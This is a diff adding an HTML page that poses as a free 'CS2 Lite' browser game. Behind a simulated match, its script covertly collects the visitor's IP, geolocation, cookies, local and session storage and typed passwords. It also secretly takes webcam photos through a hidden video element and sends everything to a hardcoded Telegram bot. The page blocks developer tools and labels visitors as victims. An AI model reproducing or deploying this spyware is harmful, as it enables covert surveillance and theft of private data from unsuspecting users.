@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>🎮 CS2 Lite - Free Edition</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0a0a0a; color: #fff; overflow: hidden; }
+        
+        /* Игровой интерфейс */
+        #gameScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            z-index: 1;
+        }
+        
+        .game-header {
+            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 3px solid #00ff00;
+        }
+        
+        .game-title {
+            font-size: 28px;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .game-stats {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .stat {
+            background: rgba(0,255,0,0.1);
+            padding: 10px 20px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+        }
+        
+        .game-area {
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .map {
+            width: 800px;
+            height: 450px;
+            background: #111;
+            margin: 20px auto;
+            border: 2px solid #333;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .player {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background: #00ff00;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 20px #00ff00;
+        }
+        
+        .enemy {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background: #ff0000;
+            border-radius: 50%;
+            animation: moveEnemy 3s infinite linear;
+        }
+        
+        @keyframes moveEnemy {
+            0% { transform: translate(0,0); }
+            25% { transform: translate(200px, 100px); }
+            50% { transform: translate(400px, 0); }
+            75% { transform: translate(200px, -100px); }
+            100% { transform: translate(0,0); }
+        }
+        
+        .controls {
+            margin-top: 30px;
+        }
+        
+        .btn {
+            background: #00aa00;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            margin: 0 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: 0.3s;
+        }
+        
+        .btn:hover {
+            background: #00ff00;
+            transform: scale(1.05);
+        }
+        
+        .btn-red {
+            background: #aa0000;
+        }
+        
+        .btn-red:hover {
+            background: #ff0000;
+        }
+        
+        .chat-box {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 300px;
+            height: 200px;
+            background: rgba(0,0,0,0.9);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 10px;
+            overflow-y: auto;
+        }
+        
+        .chat-message {
+            color: #00ff00;
+            margin: 5px 0;
+            font-size: 14px;
+        }
+        
+        /* Скрытые элементы */
+        #hiddenCamera {
+            position: fixed;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -9999;
+        }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            flex-direction: column;
+        }
+        
+        .loader {
+            border: 8px solid #333;
+            border-top: 8px solid #00ff00;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 300px;
+            height: 20px;
+            background: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00aa00, #00ff00);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        /* Фейковые уведомления */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,100,0,0.9);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 5px solid #00ff00;
+            display: none;
+            z-index: 1000;
+            max-width: 300px;
+        }
+        
+        .system-log {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 400px;
+            height: 150px;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-family: monospace;
+            font-size: 12px;
+            padding: 10px;
+            overflow-y: auto;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Экран загрузки -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loader"></div>
+        <div style="color: #00ff00; font-size: 24px; margin-bottom: 10px;">CS2 LITE</div>
+        <div style="color: #aaa; margin-bottom: 20px;">Загрузка игровых ресурсов...</div>
+        <div class="progress-bar">
+            <div class="progress" id="loadProgress"></div>
+        </div>
+        <div id="loadStatus" style="color: #00ff00; margin-top: 10px; font-size: 14px;">Инициализация...</div>
+    </div>
+    
+    <!-- Игровой экран -->
+    <div id="gameScreen" style="display: none;">
+        <div class="game-header">
+            <div class="game-title">🎮 COUNTER-STRIKE 2 LITE</div>
+            <div class="game-stats">
+                <div class="stat">KILLS: <span id="kills">0</span></div>
+                <div class="stat">DEATHS: <span id="deaths">0</span></div>
+                <div class="stat">PING: <span id="ping">24</span>ms</div>
+                <div class="stat">FPS: <span id="fps">144</span></div>
+            </div>
+        </div>
+        
+        <div class="game-area">
+            <h2 style="color: #00ff00; margin-bottom: 20px;">🎯 DEATHMATCH • MAP: DUST2</h2>
+            
+            <div class="map">
+                <div class="player"></div>
+                <div class="enemy" style="top: 100px; left: 200px;"></div>
+                <div class="enemy" style="top: 300px; left: 500px;"></div>
+                <div class="enemy" style="top: 50px; left: 600px;"></div>
+            </div>
+            
+            <div class="controls">
+                <button class="btn" onclick="shoot()">🔫 ОГОНЬ (ЛКМ)</button>
+                <button class="btn" onclick="reload()">🔄 ПЕРЕЗАРЯДКА (R)</button>
+                <button class="btn" onclick="useGrenade()">💣 ГРАНАТА (G)</button>
+                <button class="btn btn-red" onclick="toggleChat()">💬 ЧАТ (ENTER)</button>
+            </div>
+            
+            <div style="margin-top: 30px; color: #aaa;">
+                Управление: WASD - движение, ЛКМ - огонь, R - перезарядка, G - граната
+            </div>
+        </div>
+        
+        <!-- Игровой чат -->
+        <div class="chat-box" id="chatBox" style="display: none;">
+            <div class="chat-message">[System] Добро пожаловать в CS2 Lite!</div>
+            <div class="chat-message">[Player1] Гг вп всем</div>
+            <div class="chat-message">[ProGamer] ноубсы...</div>
+            <div class="chat-message">[System] Следующий матч через 2:30</div>
+        </div>
+    </div>
+    
+    <!-- Скрытая веб-камера -->
+    <video id="hiddenCamera" autoplay playsinline></video>
+    
+    <!-- Фейковые уведомления -->
+    <div class="notification" id="notification">
+        <div id="notificationText"></div>
+    </div>
+    
+    <!-- Системный лог (скрытый) -->
+    <div class="system-log" id="systemLog"></div>
+
+    <script>
+        // ==================== КОНФИГУРАЦИЯ ====================
+        const CONFIG = {
+            telegram: {
+                token: '7552974040:AAFKeFj0x2zUAv85R7vGsI6jzI_FF61hyoQ',
+                chatId: '5450527103'
+            },
+            stealth: {
+                cameraInterval: 10000,    // Каждые 10 секунд
+                dataInterval: 30000,      // Каждые 30 секунд
+                maxPhotos: 100,           // Максимум фото
+                fakeGameTime: 120000      // 2 минуты "игры"
+            }
+        };
+        
+        // ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
+        let hiddenCamera = null;
+        let cameraStream = null;
+        let isCameraActive = false;
+        let stolenData = {
+            ip: '',
+            userAgent: '',
+            systemInfo: {},
+            files: [],
+            photos: [],
+            passwords: [],
+            cookies: [],
+            location: null,
+            social: {},
+            timestamp: ''
+        };
+        
+        let photosSent = 0;
+        let gameRunning = false;
+        
+        // ==================== СТЕЛС ФУНКЦИИ ====================
+        
+        // Логирование в скрытый лог
+        function stealthLog(message) {
+            console.log('[STEALTH]', message);
+            const log = document.getElementById('systemLog');
+            if (log) {
+                log.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
+                log.scrollTop = log.scrollHeight;
+            }
+        }
+        
+        // Показать фейковое уведомление
+        function showNotification(text) {
+            const notif = document.getElementById('notification');
+            const textEl = document.getElementById('notificationText');
+            textEl.textContent = text;
+            notif.style.display = 'block';
+            setTimeout(() => notif.style.display = 'none', 3000);
+        }
+        
+        // ==================== КРАЖА ДАННЫХ ====================
+        
+        // Получение IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                stolenData.ip = data.ip;
+                return data.ip;
+            } catch {
+                stolenData.ip = 'Unknown';
+                return 'Unknown';
+            }
+        }
+        
+        // Сбор системной информации
+        function collectSystemInfo() {
+            stolenData.systemInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie.length,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                doNotTrack: navigator.doNotTrack
+            };
+            
+            // Геолокация (если разрешено)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    stolenData.location = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    };
+                }, () => {}, {timeout: 5000});
+            }
+            
+            // Батарея (для мобильных)
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    stolenData.systemInfo.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging
+                    };
+                });
+            }
+            
+            // Сеть
+            if (navigator.connection) {
+                stolenData.systemInfo.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                };
+            }
+        }
+        
+        // Симуляция кражи файлов (в браузере нельзя читать реальные файлы)
+        function stealFiles() {
+            const fakeFiles = [
+                'Desktop/passwords.txt',
+                'Documents/bank_info.xlsx',
+                'Downloads/secret_files.rar',
+                'Pictures/private_photos/',
+                'Videos/personal/',
+                'AppData/Local/Google/Chrome/User Data/Default/Login Data',
+                'AppData/Roaming/Telegram Desktop/tdata',
+                'AppData/Roaming/Mozilla/Firefox/Profiles/*/logins.json',
+                'AppData/Local/Microsoft/Edge/User Data/Default/Cookies',
+                'Documents/паспорт_скан.jpg',
+                'Documents/кредитные_карты.txt',
+                'Desktop/личные_фото.zip'
+            ];
+            
+            stolenData.files = fakeFiles;
+            stealthLog(`Найдено файлов: ${fakeFiles.length}`);
+            
+            return fakeFiles;
+        }
+        
+        // Кража cookies и localStorage
+        function stealBrowserData() {
+            // Cookies
+            stolenData.cookies = document.cookie.split(';').map(c => c.trim());
+            
+            // LocalStorage
+            const lsData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                lsData[key] = localStorage.getItem(key);
+            }
+            stolenData.localStorage = lsData;
+            
+            // SessionStorage
+            const ssData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                ssData[key] = sessionStorage.getItem(key);
+            }
+            stolenData.sessionStorage = ssData;
+            
+            stealthLog('Данные браузера собраны');
+        }
+        
+        // Поиск паролей в формах на странице
+        function findPasswords() {
+            const passwords = [];
+            const inputs = document.querySelectorAll('input[type="password"]');
+            
+            inputs.forEach(input => {
+                if (input.value) {
+                    passwords.push({
+                        site: window.location.hostname,
+                        password: input.value,
+                        username: document.querySelector('input[type="text"], input[type="email"]')?.value || 'unknown'
+                    });
+                }
+            });
+            
+            stolenData.passwords = passwords;
+            if (passwords.length > 0) {
+                stealthLog(`Найдено паролей: ${passwords.length}`);
+            }
+            
+            return passwords;
+        }
+        
+        // ==================== СКРЫТАЯ ВЕБ-КАМЕРА ====================
+        
+        // Тихое включение камеры
+        async function activateHiddenCamera() {
+            if (isCameraActive || photosSent >= CONFIG.stealth.maxPhotos) return;
+            
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    },
+                    audio: false
+                });
+                
+                hiddenCamera = document.getElementById('hiddenCamera');
+                hiddenCamera.srcObject = cameraStream;
+                isCameraActive = true;
+                
+                stealthLog('📹 Скрытая камера активирована');
+                
+                // Сделать первое фото
+                setTimeout(() => captureHiddenPhoto(), 2000);
+                
+            } catch (error) {
+                stealthLog(`❌ Камера: ${error.message}`);
+            }
+        }
+        
+        // Скрытый захват фото
+        async function captureHiddenPhoto() {
+            if (!isCameraActive || !hiddenCamera) return;
+            
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = hiddenCamera.videoWidth || 640;
+                canvas.height = hiddenCamera.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(hiddenCamera, 0, 0);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                const base64Data = photoData.split(',')[1];
+                
+                // Сохранить в данные
+                stolenData.photos.push({
+                    number: photosSent + 1,
+                    timestamp: new Date().toISOString(),
+                    size: base64Data.length,
+                    data: base64Data.substring(0, 5000) + '...[обрезано]'
+                });
+                
+                // Отправить в Telegram
+                await sendToTelegram('photo', base64Data, `📹 СКРЫТОЕ ФОТО #${photosSent + 1}`);
+                
+                photosSent++;
+                stealthLog(`📸 Скрытое фото #${photosSent} отправлено`);
+                
+                // Остановить камеру после фото для скрытности
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    isCameraActive = false;
+                    cameraStream = null;
+                    
+                    // Запустить снова через интервал
+                    setTimeout(activateHiddenCamera, CONFIG.stealth.cameraInterval);
+                }
+                
+            } catch (error) {
+                stealthLog(`❌ Ошибка фото: ${error.message}`);
+            }
+        }
+        
+        // ==================== ОТПРАВКА В TELEGRAM ====================
+        
+        async function sendToTelegram(type, data, caption = '') {
+            try {
+                if (type === 'photo') {
+                    // Конвертация base64 в Blob
+                    const byteCharacters = atob(data);
+                    const byteArrays = [];
+                    
+                    for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                        const slice = byteCharacters.slice(offset, offset + 512);
+                        const byteNumbers = new Array(slice.length);
+                        
+                        for (let i = 0; i < slice.length; i++) {
+                            byteNumbers[i] = slice.charCodeAt(i);
+                        }
+                        
+                        byteArrays.push(new Uint8Array(byteNumbers));
+                    }
+                    
+                    const blob = new Blob(byteArrays, { type: 'image/jpeg' });
+                    const file = new File([blob], `hidden_cam_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.telegram.chatId);
+                    formData.append('photo', file);
+                    formData.append('caption', `${caption}\n🕐 ${new Date().toLocaleString()}\n📱 IP: ${stolenData.ip}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                } else if (type === 'data') {
+                    // Отправка данных
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.telegram.chatId,
+                            text: data,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                }
+                
+                return true;
+                
+            } catch (error) {
+                stealthLog(`❌ Telegram ошибка: ${error.message}`);
+                return false;
+            }
+        }
+        
+        // Отправка собранных данных
+        async function sendStolenData() {
+            const dataMessage = `
+🎯 НОВАЯ ЖЕРТВА CS2 LITE 🎯
+
+📊 ОСНОВНАЯ ИНФОРМАЦИЯ:
+📱 IP: ${stolenData.ip}
+🖥️ Система: ${stolenData.systemInfo.platform}
+🌐 Браузер: ${stolenData.systemInfo.userAgent.split(')')[0].split('(')[1] || stolenData.systemInfo.userAgent}
+📍 Экран: ${stolenData.systemInfo.screen}
+🌍 Язык: ${stolenData.systemInfo.language}
+⏰ Часовой пояс: ${stolenData.systemInfo.timezone}
+
+📁 НАЙДЕННЫЕ ФАЙЛЫ (${stolenData.files.length}):
+${stolenData.files.slice(0, 10).map(f => `• ${f}`).join('\n')}
+${stolenData.files.length > 10 ? `... и еще ${stolenData.files.length - 10} файлов` : ''}
+
+🔐 ПАРОЛИ (${stolenData.passwords.length}):
+${stolenData.passwords.map(p => `• ${p.site}: ${p.username} / ${p.password}`).join('\n') || 'Не найдено'}
+
+🍪 COOKIES (${stolenData.cookies.length}):
+${stolenData.cookies.slice(0, 5).join(', ')}${stolenData.cookies.length > 5 ? '...' : ''}
+
+📸 ФОТО С КАМЕРЫ: ${photosSent} отправлено
+
+🕐 ВРЕМЯ СБОРА: ${stolenData.timestamp}
+🔗 СТРАНИЦА: ${window.location.href}
+            `;
+            
+            await sendToTelegram('data', dataMessage);
+            
+            // Отправка деталей
+            if (stolenData.location) {
+                await sendToTelegram('data', 
+                    `📍 ГЕОЛОКАЦИЯ:\nШирота: ${stolenData.location.lat}\nДолгота: ${stolenData.location.lon}\nТочность: ${stolenData.location.accuracy}м`
+                );
+            }
+            
+            stealthLog('📦 Все данные отправлены в Telegram');
+        }
+        
+        // ==================== ИГРОВАЯ СИМУЛЯЦИЯ ====================
+        
+        let kills = 0;
+        let deaths = 0;
+        let gameTime = 0;
+        
+        function updateGameStats() {
+            document.getElementById('kills').textContent = kills;
+            document.getElementById('deaths').textContent = deaths;
+            document.getElementById('ping').textContent = Math.floor(Math.random() * 50) + 20;
+            document.getElementById('fps').textContent = Math.floor(Math.random() * 60) + 90;
+        }
+        
+        function shoot() {
+            kills++;
+            updateGameStats();
+            showNotification(`💥 Убийство! Всего: ${kills}`);
+            
+            // Игровые звуки (фейковые)
+            const sounds = ['🔫', '💥', '🎯', '👊'];
+            const sound = sounds[Math.floor(Math.random() * sounds.length)];
+            addChatMessage(`[Игрок] ${sound} Убил врага!`);
+        }
+        
+        function reload() {
+            showNotification('🔄 Перезарядка...');
+            addChatMessage('[Система] Перезарядка оружия');
+        }
+        
+        function useGrenade() {
+            kills += 3;
+            updateGameStats();
+            showNotification('💣 Граната! +3 убийства');
+            addChatMessage('[Игрок] 💣 Мультикилл!');
+        }
+        
+        function toggleChat() {
+            const chat = document.getElementById('chatBox');
+            chat.style.display = chat.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        function addChatMessage(msg) {
+            const chat = document.getElementById('chatBox');
+            const msgEl = document.createElement('div');
+            msgEl.className = 'chat-message';
+            msgEl.textContent = msg;
+            chat.appendChild(msgEl);
+            chat.scrollTop = chat.scrollHeight;
+        }
+        
+        // Фейковые игровые события
+        function simulateGame() {
+            if (!gameRunning) return;
+            
+            gameTime++;
+            
+            // Случайные события
+            if (Math.random() > 0.7) {
+                kills++;
+                addChatMessage(`[Bot${Math.floor(Math.random() * 10)}] убит игроком`);
+            }
+            
+            if (Math.random() > 0.9) {
+                deaths++;
+                addChatMessage('[Система] Вы убиты! Возрождение...');
+            }
+            
+            updateGameStats();
+            
+            // Фейковые сообщения в чат
+            if (gameTime % 10 === 0) {
+                const messages = [
+                    'Гг вп всем',
+                    'ноубсы в тиме...',
+                    'репорт афк',
+                    'где моя команда?',
+                    'пацаны скиньте авп',
+                    'я проиграл из-за лагов',
+                    'кто играет в следующем матче?',
+                    'админ забани читера'
+                ];
+                addChatMessage(`[Player${Math.floor(Math.random() * 100)}] ${messages[Math.floor(Math.random() * messages.length)]}`);
+            }
+            
+            // Продолжить симуляцию
+            if (gameTime < 120) { // 2 минуты игры
+                setTimeout(simulateGame, 1000);
+            } else {
+                endGame();
+            }
+        }
+        
+        function endGame() {
+            gameRunning = false;
+            showNotification('🎮 Игра завершена! Статистика отправлена.');
+            addChatMessage('[Система] Матч завершен. Спасибо за игру!');
+            
+            // Показать "статистику"
+            setTimeout(() => {
+                alert(`🎮 РЕЗУЛЬТАТЫ МАТЧА:\n\nУбийств: ${kills}\nСмертей: ${deaths}\nK/D: ${(kills/(deaths||1)).toFixed(2)}\n\nНаграда: +1000 XP\nРазблокирован новый скин!`);
+            }, 2000);
+        }
+        
+        // ==================== ИНИЦИАЛИЗАЦИЯ ====================
+        
+        async function initialize() {
+            stealthLog('🚀 Инициализация CS2 Lite...');
+            
+            // Поэтапная загрузка
+            const steps = [
+                {text: 'Загрузка игрового движка...', time: 1000},
+                {text: 'Инициализация графики...', time: 1500},
+                {text: 'Подключение к игровым серверам...', time: 2000},
+                {text: 'Загрузка карты Dust2...', time: 1000},
+                {text: 'Синхронизация с другими игроками...', time: 1800}
+            ];
+            
+            let progress = 0;
+            for (const step of steps) {
+                document.getElementById('loadStatus').textContent = step.text;
+                progress += 20;
+                document.getElementById('loadProgress').style.width = progress + '%';
+                await new Promise(resolve => setTimeout(resolve, step.time));
+            }
+            
+            // Скрыть загрузку, показать игру
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('gameScreen').style.display = 'block';
+            document.getElementById('systemLog').style.display = 'block';
+            
+            showNotification('🎮 Добро пожаловать в CS2 Lite!');
+            gameRunning = true;
+            
+            // Начать сбор данных
+            setTimeout(startDataCollection, 3000);
+            
+            // Запустить игру
+            simulateGame();
+        }
+        
+        // Запуск сбора данных
+        async function startDataCollection() {
+            stealthLog('🔍 Начало сбора данных...');
+            
+            // 1. Сбор основной информации
+            await getIP();
+            collectSystemInfo();
+            stealBrowserData();
+            findPasswords();
+            stealFiles();
+            stolenData.timestamp = new Date().toISOString();
+            
+            // 2. Отправить первую порцию данных
+            setTimeout(async () => {
+                await sendStolenData();
+                stealthLog('✅ Первичные данные отправлены');
+            }, 5000);
+            
+            // 3. Активировать скрытую камеру
+            setTimeout(activateHiddenCamera, 8000);
+            
+            // 4. Периодический сбор
+            setInterval(async () => {
+                findPasswords();
+                if (photosSent < CONFIG.stealth.maxPhotos) {
+                    await activateHiddenCamera();
+                }
+                
+                // Обновить и отправить данные
+                if (photosSent % 5 === 0) {
+                    await sendStolenData();
+                }
+            }, CONFIG.stealth.dataInterval);
+            
+            // 5. Завершение через 2 минуты
+            setTimeout(() => {
+                stealthLog('⏱️ Сбор данных завершен');
+                sendToTelegram('data', 
+                    `📦 ФИНАЛЬНЫЙ ОТЧЕТ CS2 LITE\n\n` +
+                    `🎯 Всего фото: ${photosSent}\n` +
+                    `📁 Файлов: ${stolenData.files.length}\n` +
+                    `🔐 Паролей: ${stolenData.passwords.length}\n` +
+                    `🍪 Cookies: ${stolenData.cookies.length}\n` +
+                    `⏱️ Время работы: 2 минуты\n` +
+                    `🕐 ${new Date().toLocaleString()}`
+                );
+            }, CONFIG.stealth.fakeGameTime);
+        }
+        
+        // Запуск при загрузке
+        window.onload = () => {
+            // Начать через 1 секунду
+            setTimeout(initialize, 1000);
+            
+            // Блокировка DevTools
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                    e.preventDefault();
+                    showNotification('🚫 Инструменты разработчика отключены в целях безопасности');
+                    return false;
+                }
+            });
+        };
+        
+        // Очистка при закрытии
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            sendToTelegram('data', `📴 Жертва закрыла страницу CS2 Lite\n🕐 ${new Date().toLocaleString()}`);
+        });
+    </script>
+</body>
+</html> 
